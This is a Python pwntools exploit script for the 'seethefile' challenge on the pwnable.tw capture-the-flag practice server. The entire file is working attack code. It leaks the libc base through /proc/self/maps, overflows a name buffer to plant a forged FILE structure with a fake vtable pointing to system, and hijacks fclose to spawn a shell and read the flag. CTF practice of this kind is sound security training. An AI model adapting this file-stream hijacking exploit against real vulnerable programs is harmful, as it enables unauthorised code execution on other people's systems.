#!/usr/bin/env python
from pwn import *
from FILE import * # https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#FILE.py%20FILE%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0%E6%A8%A1%E5%9D%97

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
	p = process('./seethefile')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('chall.pwnable.tw', 10200)
	libc = ELF('./libc_32.so.6')

def cmd(c):
	p.recvuntil('choice :')
	p.sendline(str(c))

def openfile(filename):
	cmd(1)
	p.recvuntil('see :')
	p.sendline(filename)

def readfile():
	cmd(2)

def writefile():
	cmd(3)

def closefile():
	cmd(4)

def leave(name):
	cmd(5)
	p.recvuntil('name :')
	p.sendline(name)

name_addr = 0x0804b260
fp_addr = 0x0804b280
fake_file_addr = fp_addr + 4
vtable_addr = fake_file_addr + 0x98

openfile('/proc/self/maps')
readfile()
writefile()
p.recvuntil('[heap]\n')
libc_base = int(p.recvuntil('\n')[:8], 16) + 0x1000
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

fake_file = IO_FILE_plus_struct()
fake_file._flags = 0x6e69622f
fake_file._IO_read_ptr = 0x0068732f
fake_file._lock = name_addr
fake_file.vtable = vtable_addr
payload = '\x00' * (fp_addr - name_addr) # padding
payload += p32(fake_file_addr)
payload += str(fake_file)
payload += '\x00' * 0x44 + p32(system_addr) # fake_vtable
#gdb.attach(p, 'b *0x8048b0f\nb _IO_new_fclose\nb *do_system+1092\nc')
leave(payload)
p.sendline('/home/seethefile/get_flag')
p.recvuntil('magic :')
p.sendline('Give me the flag\x00')
p.interactive()

